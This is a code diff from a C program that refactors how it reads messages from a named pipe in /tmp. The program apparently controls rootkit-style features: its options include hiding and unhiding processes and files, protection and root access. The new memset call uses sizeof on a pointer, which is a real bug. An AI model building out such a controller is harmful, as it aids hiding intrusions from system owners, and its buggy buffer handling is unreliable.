@@ -171,15 +171,17 @@ void write_buffer(char **dest_ptr, char *src, size_t size)
     *dest_ptr += size;
 }
 
-void read_from_pipe(char *pipe_name, int fd, char *buf){
+void read_from_pipe(char *pipe_name, char *pipe_buf){
     
-    /* create pipe */
-    mkfifo(pipe_name, 0666);
+    /*  Clear buffer */
+    memset(pipe_buf, 0, sizeof(pipe_buf));
 
-    fd = open(my_fifo, O_RDONLY);
-    read(fd, buf, MAX_BUF);
-    printf("Received %s\n", buf); 
-    close(fd);
+    /* Open pipe */
+    int pipe_fd = open(pipe_name, O_RDONLY);
+
+    read(pipe_fd, pipe_buf, MAX_BUF);
+    printf("Received %s\n", pipe_buf); 
+    close(pipe_fd);
 }
 
 int main(int argc, char **argv)
@@ -196,9 +198,12 @@ int main(int argc, char **argv)
     int protect;
     int unprotect;
 
-    int fd;
-    char *my_fifo = "/tmp/my_fifo";
-    char buf[MAX_BUF];
+    int pipe_fd;
+    char *pipe_name = "/tmp/my_fifo";
+    char pipe_buf[MAX_BUF];
+
+    /* create pipe */
+    mkfifo(pipe_name, 0666);
 
     handle_command_line_arguments(argc, argv, &root, &hide_pid, &unhide_pid, &pid,
                                   &hide_file, &unhide_file, &file, &hide, &unhide,
